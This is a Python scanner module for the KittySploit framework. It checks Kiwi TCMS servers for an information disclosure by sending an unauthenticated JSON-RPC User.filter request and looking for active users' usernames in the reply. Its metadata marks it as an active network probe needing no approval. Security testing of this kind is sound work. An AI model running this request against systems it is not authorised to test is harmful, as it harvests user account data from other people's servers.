#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Internal info exposed in Kiwi TCMS."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Kiwi TCMS Information Disclosure Detection',
        'description': 'Internal info exposed in Kiwi TCMS.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'kiwitcms', 'exposure', 'misconfig', 'hackerone', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://hackerone.com/reports/968402',
            'https://kiwitcms.org/blog/kiwi-tcms-team/2020/08/23/kiwi-tcms-86/',
        ],
    }

    def run(self):
        path = '/json-rpc/'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json', 'Accept-Encoding': 'gzip, deflate'}, data='{"jsonrpc":"2.0","method":"User.filter","id": 1,"params":{"query":{"is_active":true}}}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('result', 'username', 'jsonrpc', 'is_active',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Kiwi TCMS Information Disclosure detected', path=path)
            return True
        return False

